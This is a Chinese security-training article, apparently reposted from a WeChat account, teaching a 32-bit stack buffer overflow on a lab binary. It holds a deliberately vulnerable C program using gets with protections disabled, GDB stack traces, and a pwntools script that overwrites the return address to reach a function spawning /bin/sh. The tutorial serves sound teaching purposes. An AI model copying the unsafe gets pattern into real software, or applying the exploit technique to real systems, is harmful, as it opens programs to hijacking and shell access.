<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HXtDQ0nhv3TgvkdDPOt6qw)

本文是 i 春秋论坛签约作家「Binary star」分享的技术文章，公众号旨在为大家提供更多的学习方法与技能技巧，文章仅供学习参考。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd76lmGw1uF0UxdjYNwM2toOTF7rmqQw2m0LciasSbSHMM7sib3gy4sUNyCp912jvbdicBwib8n3N95OPA/640?wx_fmt=jpeg&from=appmsg)

Binary star

  

大家好，我是 Binary star，目前从事于公安行业，擅长 Web、二进制和电子取证方向。能把网络安全技能运用在工作中，与我的职业结合起来做有意义的事，是非常自豪的，我希望通过自身努力成为一名优秀的二进制研究员，实现自我价值。

  

![](https://mmbiz.qpic.cn/mmbiz_png/Ljib4So7yuWia5te5wMdlKF9EotqjvnTh7KrNCMdaT67jSPzfRia16dew7xVEanQE0jZOEgvCmNjrh793sBwV8zcg/640?wx_fmt=png)

  

Stack Overflow 是一种程序的运行时（runtime）错误，中文翻译过来叫做 “栈溢出”。栈溢出原理是指程序向栈中的某个变量中写入的字节数超过了这个变量本身所申请的字节数，导致与其相邻的栈中的变量值被改变。

在本篇文章中，我详细介绍了如何利用程序中本身存在的栈溢出漏洞，达到劫持程序流的目的，进而实现 system("/bin/sh") 的效果，如果你也对这个知识点感兴趣，欢迎阅读全文，内容篇幅较长，阅读时长约 12 分钟。

  

**C 语言程序**

来分析劫持程序流的过程

```
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it.");system("/bin/sh"); }
void vulnerable() {
    char s[12];
    gets(s);
    puts(s);
    return;
}
int main(int argc, char **argv) {
    vulnerable();
    return 0;
}
#编译
gcc -m32 -fno-stack-protector 1.c -o hello_world -z execstack

```

编译后用 checksec 确认，Canary、PIE、NX，这三个表示三种保护方式，此 demo 不涉及绕过保护方式，因此保护全关。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9k2ibXoH1rDJOHIxJZWnoqYNTic7IQeHFP8HpJ9fCWmI6nBAqtkVbkDl2w/640?wx_fmt=png)

**运行**

**从运行的角度看程序**

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9knV6HQZwIMcn9Vhu94vfiategM8QcjWWKyiaKGzwDZQibIkOLUVmd6ArhA/640?wx_fmt=png)

可以看到，我们在键盘上输入的东西，会在显示器再输出一遍，这是因为在 vulnerable() 函数中的 get()、puts（）两个函数的原因。

我们来从运行的角度来分析一下 C 语言程序，程序会认为 main 函数是入口，首先会执行 main 函数，main 函数中调用 vulnerable 函数，之后再返回 main 函数，至此程序结束。

但是发现这里还有一个函数是 success 函数，里面有 system("/bin/sh") 这个内置的危险函数，试想一下，如果能够在程序运行的过程中，劫持程序流，是不是就能够通过这个二进制程序拿到此机器的 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kYZDnLpFb3ue6flOYqicqmc1tErucr0X2EyASRGI7wXuU6WhhmA5tiaAA/640?wx_fmt=png)

  

****从汇编的角度看程序****

  

main 函数的地址为 0x080484BB

vulnerable 函数的地址为 0x08048494

success 函数的地址为 0x0804846B

plt 表和 got 表中有 gets 、puts、system 等函数，这些是属于内置函数，在程序运行的过程中，有动态链 ** 接的过程。

main 函数

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9krz4EjHMYPgvn6GwxicVmnlcJGA5zVnnoiaLKP5IjdrtDZguibSxzic7HZw/640?wx_fmt=png)

在 vulnerable 函数中，主要就是 gets 和 puts 函数，这里我们注意一下，我们就是用 vulnerable 这个函数来进行程序劫持的。

success 函数

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kibliaicHIAG2kDoNukibTUEZusoSyGb5x9n10dTp0QpB69RD92plmhkVNw/640?wx_fmt=png)

打印一句话 you have already controlled it，还有就是 system（"/bin/sh"），要想办法把程序执行到 success 函数中。

用 GDB 进行调试

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kOKmciaCypTD4Kkqbd3mPCicGGJyibxM6RFVZKnvibuxAoXzYdWyenooyow/640?wx_fmt=png)

在 main 函数中下一个断点，开始调试。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kib23hrhhIUpTw06iazUvJ2qgqckNhH60mu1W1HX1B4icQLh37RDLMhlDw/640?wx_fmt=png)

进入到 vulnerable 函数

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kIN3j6xeLjRRsP13IeumC8X7cjeEZInqEv6XQyK6MWGO247vb2hZBSQ/640?wx_fmt=png)

```
push ebp
move ebp，esp
sub esp ，0x18

在这先记录两个地址
EBP 0xffffd068
ESP 0xffffd05c

```

这三句汇编语言是经典的开辟栈空间，对于计算机来说，它会认为 bp 和 sp 是栈底和栈顶。

**在经过 push ebp 之后**

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kOVX0o0edozWoy253SHlfSKl4j2l1APevVAxLoVqFdnMhl2RwM54dvw/640?wx_fmt=png)

```
EBP 0xffffd068
ESP 0xffffd058
ebp 存储在了0XFFFFD05C这个位置上，ESP由 0xffffd05c变为了 0xffffd058

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9k2g5yUwibyIPzn2PJK46oTA3TicaR6ldGZWkngb6s4iblroQhwdO5uHMRg/640?wx_fmt=png)

所以 push ebp 做了两个事情，首先是把 ebp 的值存放在了栈上，然后 esp=esp-4。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kngcdKwicb83bsBaMGJrPz5GVN31lwFIfCwt8foFBwezXGMYTsfH96Gg/640?wx_fmt=png)

move ebp，esp 这个汇编指令就很简单了，把 esp 的值复制一份给 ebp

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kPzRGt6nfU2En9k6UKhBFe3LmpSwsDzKN87r2PYcY4OkTRib8x8CibeKA/640?wx_fmt=png)

现在 ebp 和 esp 指向同一位置，都为 0xffffd058。

之后是 sub esp，0x18

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7MTFvxUe2MdR9eW3nXQn9kQoDlA3XstSrxbqibA8FIE5ticaDrsUpkciaico8eic9ia1ylMYh0VFgHhUnw/640?wx_fmt=png)

EBP 0xffffd058

ESP 0xffffd040

至此栈空间开辟完成。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOic7TWjkwWDRvXgibmoIg4poKzkbqHlPicicvUhYOG6vcwl3P66y4CJ2gjAA/640?wx_fmt=png&from=appmsg)

再来分析 gets 和 puts 函数

```
0x8048494 <vulnerable> push ebp
0x8048495 <vulnerable+1> mov ebp, esp
0x8048497 <vulnerable+3> sub esp, 0x18
0x804849a <vulnerable+6> sub esp, 0xc
► 0x804849d <vulnerable+9> lea eax, [ebp - 0x14] <0xf7fb9dbc>
0x80484a0 <vulnerable+12> push eax
0x80484a1 <vulnerable+13> call gets@plt <0x8048320>

```

ebp-0x14=0xffffd058-0x14=0xffffd044

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOick4ibloxTVK5yLgfOxibWMaPKnQtibXw8scbK4LxFoIrvyA6BrE6wT4vjQ/640?wx_fmt=png&from=appmsg)

get 函数会请求键盘输入

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicf0csrz2C9WdrXib45mNBbdvQ1XhPMyicdDygje3XuRWmWOSkRj2v3kuQ/640?wx_fmt=png&from=appmsg)

我们输入 aaaaaaaabbbbbbbb

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicU8V7AtmltXJbT2tVBuVtic1cickiaZgCZGZiaRdq3icKnjvJ7xCOgiav0TSg/640?wx_fmt=png&from=appmsg)

从 0xffffd044 开始填充字符，正好是 0x10 个字符，接着我们可以看到，0xffffd086 这个地址，这是之前的 ebp。

我们用多点垃圾字符进行填充，这样就会把 ebp 的值给覆盖掉了。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOic4CRsQmRMgiczibJ5c7l4ACJdZ2ZzczaCnxEVo31ZwV8WNvhP0g5ME4bQ/640?wx_fmt=png&from=appmsg)

接着执行，会看到 ret 的时候，就不能够返回正常的 main 函数了。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicDz9tn7q3OPibXMKicUeayNXfPtrBOEicLhWSQ1ibVKCVSsmo66OAqwLHPw/640?wx_fmt=png&from=appmsg)

看一下正常情况，如果是正常情况的话，会返回到 main 函数中，这里需要注意一个细节，EIP 这个寄存器，计算机会执行 EIP 指向的东西。根据这个原理，就可以进行构造，当 ret 的时候，EIP 指向的东西为 success 函数的地址即可，这样就可以调用 success 函数了，从而达到劫持程序流的目的。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOic4mdQFiaib9qvNNicsZqTunTiaSBZqpA0hJtWpa8gPl7dz4LNibqPOBVCqnQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicFWuBpHJlfCS2iaqfC32OZcnqJwF5y2fRXjgRnyJf4f68tdWAIEHFNnw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOic9PwNxYwzicZwXADev3X4DBibs1hm8SVicXWbdB2fPmnlfvYibKGoUkwQTg/640?wx_fmt=png&from=appmsg)

****单步调试 vulnerable 函数****

```
进入vulnerable函数之前
EBP 0xffffd068 ◂— 0x0
ESP 0xffffd060 —▸ 0xf7fb83dc (__exit_funcs) —▸ 0xf7fb91e0 (initial) ◂— 0
进入vulnerable函数之后
EBP 0xffffd068 ◂— 0x0
ESP 0xffffd05c —▸ 0x80484d1 (main+22) ◂— mov eax, 0
push ebp ebp压入栈中
EBP 0xffffd068 ◂— 0x0
ESP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
move ebp，esp 导致ebp和esp同一个值
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
sub esp，0x18
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd040 ◂— 0x1
sub esp，0xc
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd034 —▸ 0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x2d
/* 0x1b2db0 */
add esp，0x10
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd040 ◂— 0x1
sub esp, 0xc
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd034 —▸ 0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x2d
/* 0x1b2db0 */
push eax
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd030 —▸ 0xffffd044 ◂— 'aaaa'
add esp，0x10
EBP 0xffffd058 —▸ 0xffffd068 ◂— 0x0
ESP 0xffffd040 ◂— 0x1
leave leave指令分为两步，move esp，ebp pop ebp
也就是说，把bp的值给sp，bp=sp=0xffffd068， 之后是弹出ebp的值，sp=sp-4
EBP 0xffffd068 ◂— 0x0
ESP 0xffffd05c —▸ 0x80484d1 (main+22) ◂— mov eax, 0
ret 相当于pop eip
EBP 0xffffd068 ◂— 0x0
ESP 0xffffd060 —▸ 0xf7fb83dc (__exit_funcs) —▸ 0xf7fb91e0 (initial) ◂— 0

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicVGHyx5hQvWNHqy7mWUINiam8Am7DPRicGOzmrOeAhe0G83ibY2aNicAWdw/640?wx_fmt=png&from=appmsg)

构造的时候首先利用 gets 函数用垃圾字符把栈空间填满，之后用四个字符覆盖 ebp，紧接着加上 success 函数的地址就可以了。

****劫持程序流****

**第一步算距离**

首先我们需要先算出 gets 函数让我们输入的地方距离 EBP 的距离，即 0xffffd44-0xffffd058=0x14。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicztDAlSaAm4LjJeCeHdpvnkQWIchc53E2keAaev920Oj7fMccTueyaA/640?wx_fmt=png&from=appmsg)

  

****第二步用数据填充****

  

0x14 就是 20 个字符，用 20 个 a 进行填充。  

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicibtiatkEwuTaZhpft5hJ9vDkD6G0Zd00Zr7vKq8YaWsibQHhmnOKmybibg/640?wx_fmt=png&from=appmsg)

这是 20 个字符，接着用 4 字符覆盖 ebp，再加上 success 函数的地址就可以了。

```
##coding=utf8
from pwn import *
import pwnlib
context(os = 'linux',arch='amd64',log_level='debug')
## 构造与程序交互的对象
sh = process('./hello_world')
success_addr = 0x0804846B
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
pwnlib.gdb.attach(sh)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()

```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOic3qQIoiaz3cPuNXIz8bS2SmtOcR3ibXZ0icRh5BGWMEWARvic011N86xARg/640?wx_fmt=png&from=appmsg)

payload = 'a' * 0x14 + 'bbbb' + p32(success_addr) ，原理就是利用变量覆盖栈空间，之后再覆盖掉原始的 ebp 寄存器的内容，紧接着就是返回地址了，把 success 函数的地址打进去就可以执行 success 函数了。  

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd7dNIUcxAwsY3eQ5RZo2sOicAkrYKELq9rfBg33Kpda5DnnxIAZYlvWxhb1CpeX7xrJ8GVEgStS9Dg/640?wx_fmt=png&from=appmsg)

**作者寄语**

通过本篇文章的学习，希望大家在二进制方向能少走弯路。学习过程中难免会遇到疑问，推荐加入 i 春秋的学习交流群~

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWhRkXWibqVZvOHibdS2KKDicrmciaN1Sr30BoDQ4U05KDVYwckibeYNFM9gzATl4I8dxbF8eVib5lTjHKUw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd5vIpn4s4AwztIaRDzOWGU08ERQsibf7h4WnSMtXyqN8NxAOSrMvravu0KUJB5HQfKjicHMFeQ6LZgQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

（联系管理员，申请入群）

在这里，您不仅能学习到前沿的技术知识，还能结识一群志同道合、热爱技术分享的学习伙伴。群管理员不定期举办各种形式的福利活动，邀请行业大咖和知识达人分享他们的宝贵经验，您还能获得丰富的人脉资源和学习资料。我们期待您的加入，一起成长、共同进步！

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6dM2COof6RuNn1aiaAic6sF3MsJkraVoKVqe0SYT6H931IQ24SosmM9JEWDlJbvJ8MoQDEcr6GicdWQ/640?wx_fmt=png)